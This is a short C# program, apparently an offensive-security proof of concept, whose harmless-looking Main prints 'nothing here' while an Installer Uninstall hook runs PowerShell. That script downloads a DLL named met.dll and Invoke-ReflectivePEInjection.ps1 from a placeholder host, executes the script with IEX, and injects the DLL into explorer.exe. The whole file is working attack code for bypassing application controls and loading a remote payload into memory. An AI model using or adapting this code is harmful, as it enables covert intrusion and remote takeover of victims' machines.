using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
//We need to import the references in visual studio Solution Explorer and select Add Reference
//Solution Explorer ->  Add References -> Assemblies -> System.Configuration.Install
using System.Configuration.Install;


namespace Bypass
{
  class Program
  {
    static void Main(string[] args)
    {
     Console.WriteLine("nothing here")
    }
  }
    // declear Installer method
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
      // declear Unistall method    
      public override void Uninstall(System.Collections.IDictionary savedState)
        {
          //create a runspace object
          Runspace rs = RunspaceFactory.CreateRunspace();
          rs.Open();
          String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://ip/met.dll');" +
          "(New-Object System.Net.WebClient).DownloadString('http://ip/Invoke-ReflectivePEInjection.ps1') | IEX;" +
          "$procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
          
          PowerShell ps = PowerShell.Create();
          ps.Runspace = rs;
          ps.AddScript(cmd);
          ps.Invoke();
          rs.Close();
        }
    
    
     }
  
}
